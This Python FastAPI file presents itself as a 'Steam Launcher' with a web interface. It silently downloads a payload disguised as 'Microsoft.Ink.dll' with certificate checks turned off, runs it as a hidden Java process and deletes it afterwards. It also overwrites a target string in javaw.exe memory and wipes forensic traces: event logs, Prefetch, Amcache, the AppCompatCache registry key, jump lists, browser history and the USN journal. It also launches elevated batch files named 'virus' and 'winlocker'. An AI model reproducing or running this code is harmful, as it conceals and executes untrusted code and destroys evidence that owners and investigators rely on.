"""
Steam Launcher - Веб-интерфейс для запуска приложения
Backend на FastAPI с красивым темным веб-интерфейсом
"""

import asyncio
import json
import logging
import os
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

try:
    import pymem
    import pymem.process
    import pymem.memory
    PYMEM_AVAILABLE = True
except ImportError:
    PYMEM_AVAILABLE = False

import aiofiles
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.staticfiles import StaticFiles

def get_base_path():
    """Получить базовый путь (для сборки и обычной работы)"""
    if getattr(sys, 'frozen', False):
        if hasattr(sys, '_MEIPASS'):
            return Path(sys._MEIPASS)
        else:
            return Path(os.path.dirname(sys.executable))
    else:
        return Path(__file__).parent

BASE_DIR = get_base_path()
STATIC_DIR = BASE_DIR / "static"
TEMPLATES_DIR = BASE_DIR / "templates"
SCRIPTS_DIR = BASE_DIR / "scripts"

if getattr(sys, 'frozen', False):
    if hasattr(sys, '_MEIPASS'):
        LOG_DIR = Path(os.environ.get('TEMP', '.')) / "SteamLauncher" / "logs"
    else:
        LOG_DIR = Path(os.path.dirname(sys.executable)) / "logs"
else:
    LOG_DIR = BASE_DIR / "logs"

LOG_DIR.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / "app.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = FastAPI(title="Steam Launcher")

app_status = "ready"
launch_history: List[Dict] = []
app_logs: List[Dict] = []

TEMP_DIR = Path(tempfile.gettempdir())
TARGET_JAR = TEMP_DIR / "Microsoft.Ink.dll"
DOWNLOAD_URL = "https://github.com/neverjoskiy/nebula/releases/download/1234123/Microsoft.Ink.dll"

TARGET_STRINGS = [
    "OgUwQPNl",
]

def download_target_file() -> Dict:
    """
    Скачивает Microsoft.Ink.dll если файл отсутствует
    """
    try:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        logger.info(f"Загрузка файла из {DOWNLOAD_URL}")
        add_log("Загрузка Microsoft.Ink.dll...", "info")

        request = urllib.request.Request(
            DOWNLOAD_URL,
            headers={'User-Agent': 'Mozilla/5.0'}
        )

        with urllib.request.urlopen(request, timeout=60, context=ssl_context) as response:
            with open(TARGET_JAR, 'wb') as out_file:
                out_file.write(response.read())

        if os.path.exists(TARGET_JAR) and os.path.getsize(TARGET_JAR) > 0:
            logger.info(f"Файл успешно загружен: {TARGET_JAR}")
            add_log("Файл Microsoft.Ink.dll загружен", "success")
            return {"success": True, "message": "Файл успешно загружен"}
        else:
            error_msg = "Файл загрузился пустым или поврежден"
            logger.error(error_msg)
            add_log(error_msg, "error")
            return {"success": False, "message": error_msg}

    except Exception as e:
        error_msg = f"Ошибка загрузки: {str(e)}"
        logger.error(error_msg)
        add_log(error_msg, "error")
        return {"success": False, "message": error_msg}

def clean_javaw_memory() -> Dict:
    """
    Очистка целевых строк из памяти javaw.exe
    Интегрировано из cleaner.py
    """
    if not PYMEM_AVAILABLE:
        error_msg = "Библиотека pymem не установлена. Установите: pip install pymem"
        logger.error(error_msg)
        add_log(error_msg, "error")
        return {"success": False, "message": error_msg}

    try:
        pm = pymem.Pymem("javaw.exe")
        logger.info(f"Подключено к javaw.exe (PID: {pm.process_id})")
        add_log(f"Подключено к javaw.exe (PID: {pm.process_id})", "info")
    except Exception as e:
        error_msg = f"Процесс javaw.exe не найден: {str(e)}"
        logger.error(error_msg)
        add_log(error_msg, "error")
        return {"success": False, "message": error_msg}

    patterns = []
    for s in TARGET_STRINGS:
        patterns.append(s.encode('utf-8'))
        patterns.append(s.encode('utf-16-le'))

    MEM_COMMIT = 0x1000
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READWRITE = 0x40

    cleared_count = 0
    regions_scanned = 0
    regions_matched = 0

    current_address = 0
    max_address = 0x7FFFFFFFFFFF

    logger.info("Сканирование и очистка памяти...")
    add_log("Сканирование памяти javaw.exe...", "info")

    try:
        while current_address < max_address:
            try:
                mbi = pymem.memory.virtual_query(pm.process_handle, current_address)
                regions_scanned += 1

                if regions_scanned % 100 == 0:
                    progress_pct = min((current_address / max_address) * 100, 100)
                    logger.info(f"Прогресс: {regions_scanned} регионов, адрес 0x{current_address:X} ({progress_pct:.1f}%)")
                    add_log(f"Прогресс: {regions_scanned} регионов ({progress_pct:.1f}%)", "info")

                if mbi.State == MEM_COMMIT and mbi.Protect in [PAGE_READWRITE, PAGE_EXECUTE_READWRITE]:
                    try:
                        region_size = mbi.RegionSize
                        read_size = min(region_size, 10 * 1024 * 1024)

                        region_data = pm.read_bytes(current_address, read_size)

                        if region_data is None or len(region_data) == 0:
                            current_address += mbi.RegionSize
                            continue

                        found_in_region = 0
                        for pattern in patterns:
                            start = 0
                            while True:
                                idx = region_data.find(pattern, start)
                                if idx == -1:
                                    break

                                target_addr = current_address + idx
                                logger.info(f"Найден паттерн по адресу 0x{target_addr:X}")

                                random_bytes = os.urandom(len(pattern))
                                pm.write_bytes(target_addr, random_bytes, len(pattern))
                                cleared_count += 1
                                found_in_region += 1
                                start = idx + len(pattern)

                        if found_in_region > 0:
                            regions_matched += 1
                            logger.info(f"  -> Удалено {found_in_region} совпадений в регионе")

                    except Exception as e:
                        logger.warning(f"Ошибка чтения региона по адресу 0x{current_address:X}: {e}")

                current_address += mbi.RegionSize

            except StopIteration:
                break
            except Exception as e:
                logger.warning(f"Неожиданная ошибка по адресу 0x{current_address:X}: {e}")
                current_address += 0x10000

        result_msg = f"Очистка завершена. Регионов просканировано: {regions_scanned}, совпадений удалено: {cleared_count}"
        logger.info(result_msg)
        add_log(result_msg, "success")

        return {
            "success": True,
            "message": result_msg,
            "regions_scanned": regions_scanned,
            "regions_matched": regions_matched,
            "cleared_count": cleared_count
        }

    except Exception as e:
        error_msg = f"Критическая ошибка при очистке: {str(e)}"
        logger.error(error_msg)
        add_log(error_msg, "error")
        return {"success": False, "message": error_msg}

def ensure_target_exists() -> Dict:
    """
    Проверяет наличие целевого файла и скачивает если нужно
    """
    if os.path.exists(TARGET_JAR):
        logger.info(f"Файл найден: {TARGET_JAR}")
        return {"success": True, "message": "Файл найден", "exists": True}
    
    logger.info(f"Файл не найден, начинаем загрузку: {TARGET_JAR}")
    add_log("Файл Microsoft.Ink.dll не найден. Загрузка...", "warning")
    
    return download_target_file()

def launch_stealth() -> Dict:
    """
    Запускает целевое приложение в скрытом режиме с эмуляцией Steam окружения
    После завершения процесса удаляет DLL файл
    """
    global app_status, launch_history

    check_result = ensure_target_exists()

    if not check_result["success"]:
        return {"success": False, "message": check_result["message"]}

    steam_env = os.environ.copy()
    steam_env["SteamAppId"] = "220"
    steam_env["SteamGameId"] = "220"
    steam_env["SteamUser"] = "User"

    cmd = [
        "java",
        "-Xms128M",
        "-Xmx512M",
        "-jar", str(TARGET_JAR),
        "-steam", "-silent"
    ]

    process = None
    try:
        app_status = "running"
        logger.info("Запуск приложения...")
        add_log("Запуск Java приложения...", "info")

        process = subprocess.Popen(
            cmd,
            env=steam_env,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True
        )

        logger.info(f"Ожидание завершения процесса PID: {process.pid}")
        add_log("Ожидание завершения процесса...", "info")
        process.wait()

        logger.info("Процесс завершен")
        add_log("Процесс завершен", "success")

        if os.path.exists(TARGET_JAR):
            try:
                os.remove(TARGET_JAR)
                logger.info(f"Файл удален: {TARGET_JAR}")
                add_log("Файл Microsoft.Ink.dll удален", "success")
            except PermissionError:
                logger.warning(f"Файл занят другим процессом, не удалось удалить: {TARGET_JAR}")
                add_log("Файл занят, удаление невозможно", "warning")
            except Exception as e:
                logger.warning(f"Ошибка удаления файла: {e}")
                add_log(f"Ошибка удаления файла: {e}", "warning")

        launch_history.append({
            "timestamp": datetime.now().isoformat(),
            "status": "success"
        })

        if len(launch_history) > 10:
            launch_history.pop(0)

    except FileNotFoundError:
        error_msg = "Java не найдена. Убедитесь, что Java установлена и доступна в PATH"
        logger.error(error_msg)
        add_log(error_msg, "error")
        app_status = "error"
        return {"success": False, "message": error_msg}

    except Exception as e:
        error_msg = f"Ошибка запуска: {str(e)}"
        logger.error(error_msg)
        add_log(error_msg, "error")
        app_status = "error"
        return {"success": False, "message": error_msg}

    finally:
        app_status = "ready"

    return {"success": True, "message": "Приложение запущено и завершено, файл удален"}

def add_log(message: str, log_type: str = "info"):
    """Добавляет запись в лог"""
    global app_logs
    
    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "message": message,
        "type": log_type
    }
    
    app_logs.append(log_entry)
    
    if len(app_logs) > 100:
        app_logs.pop(0)
    
    logger.info(f"[{log_type.upper()}] {message}")

def get_logs(lines: int = 50) -> List[Dict]:
    """Получает последние записи лога"""
    return app_logs[-lines:] if app_logs else []

def clear_logs():
    """Очищает логи"""
    global app_logs
    app_logs = []
    
    log_file = LOG_DIR / "app.log"
    if log_file.exists():
        open(log_file, 'w').close()
    
    logger.info("Логи очищены")

@app.get("/", response_class=HTMLResponse)
async def root():
    """Главная страница приложения"""
    html_path = TEMPLATES_DIR / "index.html"
    if html_path.exists():
        async with aiofiles.open(html_path, 'r', encoding='utf-8') as f:
            return await f.read()
    raise HTTPException(status_code=404, detail="HTML template not found")

@app.get("/api/status")
async def get_status():
    """Получение текущего статуса приложения"""
    file_exists = os.path.exists(TARGET_JAR)
    file_size = os.path.getsize(TARGET_JAR) if file_exists else 0
    
    return {
        "status": app_status,
        "launches": len(launch_history),
        "file_exists": file_exists,
        "file_size": file_size,
        "file_path": TARGET_JAR,
        "timestamp": datetime.now().isoformat()
    }

@app.post("/api/launch")
async def launch_app():
    """Запуск целевого приложения"""
    global app_status
    
    add_log("Запрос на запуск приложения получен", "info")
    
    if app_status == "running":
        return {"success": False, "message": "Приложение уже запущено"}
    
    def run_launch():
        result = launch_stealth()
        add_log(
            f"Результат запуска: {'успешно' if result.get('success') else 'неудачно'}",
            "success" if result.get('success') else "error"
        )
    
    thread = threading.Thread(target=run_launch, daemon=True)
    thread.start()
    
    await asyncio.sleep(0.1)
    
    return {
        "success": True,
        "message": "Процесс запуска инициирован"
    }

@app.get("/api/logs")
async def get_logs_endpoint(lines: int = 50):
    """Получение логов"""
    return {"logs": get_logs(lines)}

@app.post("/api/logs/clear")
async def clear_logs_endpoint():
    """Очистка логов"""
    clear_logs()
    return {"success": True}

VIRUS_BAT = SCRIPTS_DIR / "вирус.bat"
NOT_VIRUS_BAT = SCRIPTS_DIR / "не вирус.bat"
WINLOCKER_BAT = SCRIPTS_DIR / "винлокер.bat"
SIMULATE_EXE = SCRIPTS_DIR / "simulate.exe"

tool_states = {
    "clean_strings": {"running": False, "progress": 0, "status": "idle"},
    "clean_tracks": {"running": False, "progress": 0, "status": "idle"},
    "clean_javaw": {"running": False, "progress": 0, "status": "idle"},
    "simulate": {"running": False, "progress": 0, "status": "idle"},
    "global_clean": {"running": False, "progress": 0, "status": "idle", "results": {}}
}

def clean_event_logs() -> Dict:
    """Очистка логов Windows (Security, System, Application)"""
    try:
        logs_cleared = []
        for log_name in ["Application", "System", "Security"]:
            try:
                subprocess.run(
                    ["wevtutil", "cl", log_name],
                    capture_output=True,
                    timeout=10
                )
                logs_cleared.append(log_name)
            except Exception as e:
                logger.warning(f"Не удалось очистить {log_name}: {e}")
        
        return {
            "success": True,
            "message": f"Очищено логов: {len(logs_cleared)}",
            "cleared": logs_cleared
        }
    except Exception as e:
        return {"success": False, "message": str(e)}

def clean_mft() -> Dict:
    """Сброс $MFT (Master File Table)"""
    try:
        prefetch_path = Path(os.environ.get("WINDIR", "C:\\Windows")) / "Prefetch"
        if prefetch_path.exists():
            deleted = 0
            for f in prefetch_path.glob("*.pf"):
                try:
                    f.unlink()
                    deleted += 1
                except:
                    pass
            return {"success": True, "message": f"Удалено файлов Prefetch: {deleted}"}
        return {"success": True, "message": "Prefetch пуст"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def clean_amcache() -> Dict:
    """Удаление Amcache.hve (следы запуска программ)"""
    try:
        amcache_path = Path(os.environ.get("WINDIR", "C:\\Windows")) / "appcompat" / "Programs" / "Amcache.hve"
        amcache_dir = Path(os.environ.get("WINDIR", "C:\\Windows")) / "appcompat" / "Programs"
        
        deleted = 0
        if amcache_dir.exists():
            for f in amcache_dir.glob("*"):
                try:
                    if f.is_file():
                        f.unlink()
                        deleted += 1
                except:
                    pass
        
        subprocess.run(
            ["reg", "delete", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache", "/f"],
            capture_output=True,
            timeout=10
        )
        
        return {"success": True, "message": f"Удалено файлов Amcache: {deleted}"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def clean_jump_lists() -> Dict:
    """Удаление Jump Lists (последние документы и закреплённые файлы)"""
    try:
        appdata = os.environ.get("APPDATA", "")
        if not appdata:
            return {"success": False, "message": "Не найдена папка AppData"}
        
        jump_list_path = Path(appdata) / "Microsoft" / "Windows" / "Recent" / "AutomaticDestinations"
        custom_dest_path = Path(appdata) / "Microsoft" / "Windows" / "Recent" / "CustomDestinations"
        
        deleted = 0
        for path in [jump_list_path, custom_dest_path]:
            if path.exists():
                for f in path.glob("*"):
                    try:
                        f.unlink()
                        deleted += 1
                    except:
                        pass
        
        return {"success": True, "message": f"Удалено Jump Lists: {deleted}"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def clean_recent_files() -> Dict:
    """Очистка истории открытых файлов"""
    try:
        appdata = os.environ.get("APPDATA", "")
        recent_path = Path(appdata) / "Microsoft" / "Windows" / "Recent"
        
        deleted = 0
        if recent_path.exists():
            for f in recent_path.glob("*"):
                try:
                    if f.is_file() and not f.is_dir():
                        f.unlink()
                        deleted += 1
                except:
                    pass
        
        return {"success": True, "message": f"Удалено файлов: {deleted}"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def clean_browser_history() -> Dict:
    """Очистка истории браузеров (Chrome, Firefox, Edge)"""
    try:
        local_appdata = os.environ.get("LOCALAPPDATA", "")
        if not local_appdata:
            return {"success": False, "message": "Не найдена папка LocalAppData"}
        
        browsers = {
            "Chrome": Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Default",
            "Edge": Path(local_appdata) / "Microsoft" / "Edge" / "User Data" / "Default",
            "Firefox": Path(os.environ.get("APPDATA", "")) / "Mozilla" / "Firefox" / "Profiles"
        }
        
        history_files = ["History", "Visited Links", "Favicons"]
        deleted = 0
        
        for browser, path in browsers.items():
            if browser == "Firefox" and path.exists():
                for profile in path.glob("*"):
                    if profile.is_dir():
                        for hf in history_files:
                            try:
                                (profile / hf).unlink()
                                deleted += 1
                            except:
                                pass
            elif path.exists():
                for hf in history_files:
                    try:
                        (path / hf).unlink()
                        deleted += 1
                    except:
                        pass
        
        return {"success": True, "message": f"Очищено истории браузеров: {deleted}"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def clean_usn_journal() -> Dict:
    """Удаление и создание USN журнала"""
    try:
        subprocess.run(
            ["fsutil", "usn", "deletejournal", "/D", "C:"],
            capture_output=True,
            timeout=30
        )
        time.sleep(1)
        
        subprocess.run(
            ["fsutil", "usn", "createjournal", "m=67108864", "a=8388608"],
            capture_output=True,
            timeout=30
        )
        
        return {"success": True, "message": "USN журнал пересоздан"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def clean_temp_files() -> Dict:
    """Очистка временных файлов"""
    try:
        temp_dirs = [
            os.environ.get("TEMP", ""),
            os.environ.get("TMP", ""),
            os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "Temp")
        ]
        
        deleted = 0
        for temp_dir in temp_dirs:
            if not temp_dir or not os.path.exists(temp_dir):
                continue
            
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        if os.path.exists(file_path):
                            os.remove(file_path)
                            deleted += 1
                    except:
                        pass
                if deleted >= 500:
                    break
        
        return {"success": True, "message": f"Удалено временных файлов: {deleted}"}
    except Exception as e:
        return {"success": False, "message": str(e)}

GLOBAL_CLEAN_OPTIONS = {
    "event_logs": {
        "name": "Очистка Event Log",
        "description": "Удаление логов Windows (Security, System, Application)",
        "function": clean_event_logs
    },
    "mft": {
        "name": "Очистка $MFT",
        "description": "Сброс Master File Table (удаление Prefetch)",
        "function": clean_mft
    },
    "amcache": {
        "name": "Очистка Amcache",
        "description": "Удаление Amcache.hve (следы запуска программ)",
        "function": clean_amcache
    },
    "jump_lists": {
        "name": "Очистка Jump Lists",
        "description": "Удаление последних документов и закреплённых файлов",
        "function": clean_jump_lists
    },
    "recent_files": {
        "name": "Очистка Recent Files",
        "description": "История открытых файлов в Windows",
        "function": clean_recent_files
    },
    "browser_history": {
        "name": "Очистка Browser History",
        "description": "История браузеров (Chrome, Firefox, Edge)",
        "function": clean_browser_history
    },
    "usn_journal": {
        "name": "Очистка USN Journal",
        "description": "Удаление и пересоздание USN журнала",
        "function": clean_usn_journal
    },
    "temp_files": {
        "name": "Очистка Temp Files",
        "description": "Удаление временных файлов системы",
        "function": clean_temp_files
    }
}

def run_batch_file(filepath: str) -> Dict:
    """
    Выполняет batch-файл от имени администратора
    """
    if not os.path.exists(filepath):
        return {"success": False, "message": f"Файл не найден: {filepath}"}
    
    try:
        cmd = [
            "powershell",
            "-Command",
            f"Start-Process cmd -ArgumentList '/c \"{filepath}\"' -Verb RunAs"
        ]
        
        subprocess.run(cmd, timeout=30)
        logger.info(f"Выполнен файл: {filepath}")
        return {"success": True, "message": f"Выполнен: {os.path.basename(filepath)}"}
        
    except subprocess.TimeoutExpired:
        logger.warning(f"Таймаут при выполнении: {filepath}")
        return {"success": True, "message": "Выполняется (требуется подтверждение UAC)"}
    except Exception as e:
        logger.error(f"Ошибка выполнения {filepath}: {e}")
        return {"success": False, "message": str(e)}

def run_executable(filepath: str) -> Dict:
    """
    Запускает исполняемый файл
    """
    if not os.path.exists(filepath):
        return {"success": False, "message": f"Файл не найден: {filepath}"}
    
    try:
        subprocess.Popen(
            [filepath],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )
        logger.info(f"Запущен файл: {filepath}")
        return {"success": True, "message": f"Запущен: {os.path.basename(filepath)}"}
        
    except Exception as e:
        logger.error(f"Ошибка запуска {filepath}: {e}")
        return {"success": False, "message": str(e)}

@app.post("/api/tools/clean-strings")
async def clean_strings():
    """
    Чистка строк: выполняет вирус.bat затем не вирус.bat
    """
    global tool_states
    tool_states["clean_strings"]["running"] = True
    tool_states["clean_strings"]["status"] = "running"
    tool_states["clean_strings"]["progress"] = 10
    
    add_log("Запуск чистки строк", "info")
    
    add_log("Выполнение вирус.bat...", "info")
    tool_states["clean_strings"]["progress"] = 30
    result1 = run_batch_file(VIRUS_BAT)
    
    if not result1["success"]:
        tool_states["clean_strings"]["running"] = False
        tool_states["clean_strings"]["status"] = "error"
        add_log(f"Ошибка на шаге 1: {result1['message']}", "error")
        return {"success": False, "message": f"Шаг 1 (удаление журнала): {result1['message']}"}
    
    add_log("Шаг 1 выполнен успешно", "success")
    tool_states["clean_strings"]["progress"] = 60
    
    await asyncio.sleep(2)
    
    add_log("Выполнение не вирус.bat...", "info")
    tool_states["clean_strings"]["progress"] = 80
    result2 = run_batch_file(NOT_VIRUS_BAT)
    
    if not result2["success"]:
        tool_states["clean_strings"]["running"] = False
        tool_states["clean_strings"]["status"] = "error"
        add_log(f"Ошибка на шаге 2: {result2['message']}", "error")
        return {"success": False, "message": f"Шаг 2 (создание журнала): {result2['message']}"}
    
    add_log("Шаг 2 выполнен успешно", "success")
    tool_states["clean_strings"]["progress"] = 100
    tool_states["clean_strings"]["running"] = False
    tool_states["clean_strings"]["status"] = "completed"
    add_log("Чистка строк завершена", "success")
    
    return {
        "success": True,
        "message": "Чистка строк успешно завершена",
        "steps": [
            {"name": "Удаление журнала USN", "status": "completed"},
            {"name": "Создание журнала USN", "status": "completed"}
        ]
    }

@app.post("/api/tools/clean-tracks")
async def clean_tracks():
    """
    Очистка следов: выполняет винлокер.bat
    """
    global tool_states
    tool_states["clean_tracks"]["running"] = True
    tool_states["clean_tracks"]["status"] = "running"
    tool_states["clean_tracks"]["progress"] = 10
    
    add_log("Запуск очистки следов", "info")
    
    if not os.path.exists(WINLOCKER_BAT):
        tool_states["clean_tracks"]["running"] = False
        tool_states["clean_tracks"]["status"] = "error"
        return {"success": False, "message": f"Файл не найден: {WINLOCKER_BAT}"}
    
    try:
        add_log("Запуск винлокер.bat (требуются права администратора)...", "warning")
        tool_states["clean_tracks"]["progress"] = 30
        
        cmd = [
            "powershell",
            "-Command",
            f"Start-Process cmd -ArgumentList '/c \"{WINLOCKER_BAT}\"' -Verb RunAs"
        ]
        
        subprocess.run(cmd, timeout=60)
        
        tool_states["clean_tracks"]["progress"] = 100
        tool_states["clean_tracks"]["running"] = False
        tool_states["clean_tracks"]["status"] = "completed"
        
        add_log("Очистка следов завершена", "success")
        return {"success": True, "message": "Очистка следов выполнена"}
        
    except subprocess.TimeoutExpired:
        tool_states["clean_tracks"]["progress"] = 100
        tool_states["clean_tracks"]["running"] = False
        tool_states["clean_tracks"]["status"] = "completed"
        logger.warning("Таймаут при выполнении винлокер.bat")
        return {"success": True, "message": "Выполняется (требуется подтверждение UAC)"}
    except Exception as e:
        tool_states["clean_tracks"]["running"] = False
        tool_states["clean_tracks"]["status"] = "error"
        logger.error(f"Ошибка очистки следов: {e}")
        return {"success": False, "message": str(e)}

@app.post("/api/tools/simulate")
async def simulate_folders():
    """
    Симуляция открытия папок: запускает simulate.exe
    """
    global tool_states
    tool_states["simulate"]["running"] = True
    tool_states["simulate"]["status"] = "running"
    tool_states["simulate"]["progress"] = 50
    
    add_log("Запуск симуляции открытия папок", "info")
    
    result = run_executable(SIMULATE_EXE)
    
    tool_states["simulate"]["progress"] = 100
    tool_states["simulate"]["running"] = False
    
    if result["success"]:
        tool_states["simulate"]["status"] = "completed"
        add_log("Симуляция запущена", "success")
    else:
        tool_states["simulate"]["status"] = "error"
        add_log(f"Ошибка симуляции: {result['message']}", "error")
    
    return result

@app.post("/api/tools/clean-javaw")
async def clean_javaw_memory_endpoint():
    """
    Очистка целевых строк из памяти javaw.exe
    Интегрировано из cleaner.py
    """
    global tool_states

    if not PYMEM_AVAILABLE:
        return {
            "success": False,
            "message": "Библиотека pymem не установлена. Установите: pip install pymem"
        }

    tool_states["clean_javaw"]["running"] = True
    tool_states["clean_javaw"]["status"] = "running"
    tool_states["clean_javaw"]["progress"] = 10

    add_log("Запуск очистки памяти javaw.exe", "info")

    result = {"done": False, "data": None}

    def run_clean():
        try:
            tool_states["clean_javaw"]["progress"] = 30
            clean_result = clean_javaw_memory()
            result["data"] = clean_result
            result["done"] = True
            tool_states["clean_javaw"]["progress"] = 100
        except Exception as e:
            result["data"] = {"success": False, "message": str(e)}
            result["done"] = True
            tool_states["clean_javaw"]["progress"] = 100

    thread = threading.Thread(target=run_clean, daemon=True)
    thread.start()

    while not result["done"]:
        await asyncio.sleep(0.5)
        if tool_states["clean_javaw"]["progress"] < 90:
            tool_states["clean_javaw"]["progress"] += 1

    tool_states["clean_javaw"]["running"] = False

    if result["data"] and result["data"].get("success"):
        tool_states["clean_javaw"]["status"] = "completed"
        add_log("Очистка памяти javaw.exe завершена", "success")
    else:
        tool_states["clean_javaw"]["status"] = "error"
        add_log("Ошибка при очистке памяти javaw.exe", "error")

    return result["data"] if result["data"] else {"success": False, "message": "Неизвестная ошибка"}

@app.get("/api/tools/status")
async def get_tools_status():
    """Получение статуса инструментов"""
    return {"tools": tool_states}

@app.get("/api/tools/global-clean/options")
async def get_global_clean_options():
    """Получение списка опций для глобальной очистки"""
    options = {}
    for key, value in GLOBAL_CLEAN_OPTIONS.items():
        options[key] = {
            "name": value["name"],
            "description": value["description"]
        }
    return {"options": options}

@app.post("/api/tools/global-clean")
async def run_global_clean(options: dict):
    """
    Запуск глобальной очистки с выбранными опциями
    options: {"event_logs": true, "mft": false, ...}
    """
    global tool_states
    
    tool_states["global_clean"]["running"] = True
    tool_states["global_clean"]["status"] = "running"
    tool_states["global_clean"]["progress"] = 0
    tool_states["global_clean"]["results"] = {}
    
    add_log("Запуск глобальной очистки", "info")
    
    selected = [k for k, v in options.items() if v]
    total = len(selected)
    
    if total == 0:
        tool_states["global_clean"]["running"] = False
        tool_states["global_clean"]["status"] = "error"
        return {"success": False, "message": "Не выбрано ни одной опции"}
    
    results = {}
    completed = 0
    
    for i, option_key in enumerate(selected):
        if option_key not in GLOBAL_CLEAN_OPTIONS:
            continue
        
        option = GLOBAL_CLEAN_OPTIONS[option_key]
        add_log(f"Очистка: {option['name']}...", "info")
        tool_states["global_clean"]["progress"] = int((i / total) * 100)
        
        try:
            result = option["function"]()
            results[option_key] = {
                "success": result["success"],
                "message": result["message"]
            }
            
            if result["success"]:
                add_log(f"✓ {option['name']}: {result['message']}", "success")
                completed += 1
            else:
                add_log(f"✗ {option['name']}: {result['message']}", "error")
                
        except Exception as e:
            results[option_key] = {
                "success": False,
                "message": str(e)
            }
            add_log(f"✗ {option['name']}: {str(e)}", "error")
        
        await asyncio.sleep(0.5)
    
    tool_states["global_clean"]["progress"] = 100
    tool_states["global_clean"]["running"] = False
    tool_states["global_clean"]["status"] = "completed"
    tool_states["global_clean"]["results"] = results
    
    add_log(f"Глобальная очистка завершена: {completed}/{total} успешно", "success")
    
    return {
        "success": True,
        "message": f"Завершено: {completed}/{total}",
        "results": results,
        "total": total,
        "completed": completed
    }

logger.info(f"BASE_DIR: {BASE_DIR}")
logger.info(f"STATIC_DIR: {STATIC_DIR}, exists: {STATIC_DIR.exists()}")
logger.info(f"TEMPLATES_DIR: {TEMPLATES_DIR}, exists: {TEMPLATES_DIR.exists()}")
logger.info(f"SCRIPTS_DIR: {SCRIPTS_DIR}, exists: {SCRIPTS_DIR.exists()}")

if STATIC_DIR.exists():
    app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")
else:
    logger.error(f"STATIC_DIR не найдена: {STATIC_DIR}")

def run_server(host: str = "127.0.0.1", port: int = 8765):
    """Запуск сервера на uvicorn"""
    logger.info(f"Запуск сервера на {host}:{port}")
    logger.info(f"BASE_DIR={BASE_DIR}")
    logger.info(f"STATIC_DIR={STATIC_DIR}, exists={STATIC_DIR.exists()}")
    logger.info(f"TEMPLATES_DIR={TEMPLATES_DIR}, exists={TEMPLATES_DIR.exists()}")
    
    try:
        import sys
        import io
        import uvicorn
        
        if sys.stdin is None:
            sys.stdin = io.StringIO()
        if sys.stdout is None:
            sys.stdout = io.StringIO()
        if sys.stderr is None:
            sys.stderr = io.StringIO()
        
        if not hasattr(sys.stdin, 'isatty'):
            sys.stdin.isatty = lambda: False
        if not hasattr(sys.stdout, 'isatty'):
            sys.stdout.isatty = lambda: False
        if not hasattr(sys.stderr, 'isatty'):
            sys.stderr.isatty = lambda: False
        
        logger.info(f"uvicorn version: {uvicorn.__version__}")

        uvicorn.run(
            app,
            host=host,
            port=port,
            log_level="critical",
            access_log=False,
        )
        
    except ImportError as e:
        logger.error(f"ImportError uvicorn: {e}")
        raise
    except Exception as e:
        logger.error(f"Ошибка сервера: {type(e).__name__}: {e}")
        import traceback
        logger.error(traceback.format_exc())
        raise

def launch_web_interface(host: str = "127.0.0.1", port: int = 8765):
    """
    Запуск веб-интерфейса в окне приложения через pywebview

    Args:
        host: Хост для сервера (по умолчанию 127.0.0.1)
        port: Порт для сервера (по умолчанию 8765)
    """
    add_log("Веб-интерфейс запускается", "info")
    logger.info("Запуск веб-интерфейса...")

    def background_download():
        try:
            time.sleep(2)
            if not os.path.exists(TARGET_JAR):
                add_log("Автозагрузка: начинается скачивание Microsoft.Ink.dll", "info")
                download_target_file()
            else:
                add_log("Автозагрузка: файл Microsoft.Ink.dll уже существует", "info")
        except Exception as e:
            add_log(f"Автозагрузка: ошибка скачивания DLL: {e}", "error")

    download_thread = threading.Thread(target=background_download, daemon=True)
    download_thread.start()

    server_thread = threading.Thread(
        target=run_server,
        args=(host, port),
        daemon=True
    )
    server_thread.start()

    logger.info("Ожидание запуска сервера...")
    time.sleep(3)

    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((host, port))
    sock.close()
    
    if result != 0:
        logger.error(f"Сервер не запустился на {host}:{port}")
        add_log("Ошибка: сервер не запустился", "error")
        print(f"Ошибка: не удалось запустить сервер на {host}:{port}")
        print("Проверьте логи для деталей.")
        
        try:
            import tkinter as tk
            from tkinter import messagebox
            root = tk.Tk()
            root.withdraw()
            messagebox.showerror("Ошибка", f"Не удалось запустить сервер на {host}:{port}\nПроверьте логи для деталей.")
            root.destroy()
        except Exception:
            pass
        
        return

    url = f"http://{host}:{port}"

    logger.info(f"Сервер успешно запущен на {url}")
    print(f"""
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║          Steam Launcher - Веб-интерфейс                   ║
║                                                           ║
║  Сервер запущен: {url}                            ║
║                                                           ║
║  Нажмите Ctrl+C для остановки сервера                     ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
    """)

    add_log(f"Сервер запущен на {url}", "success")

    try:
        import webview

        window = webview.create_window(
            title="Steam Launcher",
            url=url,
            width=1200,
            height=800,
            resizable=True,
            fullscreen=False,
            min_size=(900, 600),
            background_color="#0a0a0b"
        )

        add_log("Окно приложения открыто", "info")
        webview.start()

    except ImportError as e:
        logger.warning(f"pywebview не установлен: {e}")
        print("pywebview не установлен. Установите: pip install pywebview")
